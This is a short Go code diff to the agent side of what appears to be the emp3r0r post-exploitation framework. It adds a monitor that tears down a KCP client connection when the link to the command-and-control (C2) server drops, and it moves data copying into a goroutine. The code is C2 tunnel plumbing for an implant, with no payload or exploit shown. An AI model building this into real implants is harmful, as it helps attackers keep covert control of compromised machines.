@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"context"
 	"crypto/sha256"
 	"fmt"
 	"io"
@@ -8,6 +9,7 @@ import (
 	"net"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/xtaci/kcp-go/v5"
 	"golang.org/x/crypto/pbkdf2"
 )
@@ -31,6 +33,18 @@ func KCPClient() {
 		log.Printf("KCP: serving conn %s -> %s",
 			client_conn.LocalAddr(),
 			client_conn.RemoteAddr())
+
+		// monitor C2 connection state
+		ctx, cancel := context.WithCancel(context.Background())
+		go func() {
+			for emp3r0r_data.KCPKeep {
+				util.TakeABlink()
+			}
+			// kill client_conn if lost C2 connection
+			log.Printf("Killing KCP client conn %s as C2 is disconnected", client_conn.LocalAddr())
+			cancel()
+			emp3r0r_data.KCPKeep = true
+		}()
 
 		// dial to C2 KCP server
 		key := pbkdf2.Key([]byte(RuntimeConfig.ShadowsocksPassword),
@@ -58,10 +72,15 @@ func KCPClient() {
 				return
 			}
 		}()
-		_, err = io.Copy(client_conn, sess)
-		if err != nil {
-			log.Printf("client_conn -> kcp: %v", err)
-			return
+		go func() {
+			_, err = io.Copy(client_conn, sess)
+			if err != nil {
+				log.Printf("client_conn -> kcp: %v", err)
+				return
+			}
+		}()
+		for ctx.Err() == nil {
+			util.TakeABlink()
 		}
 	}
 
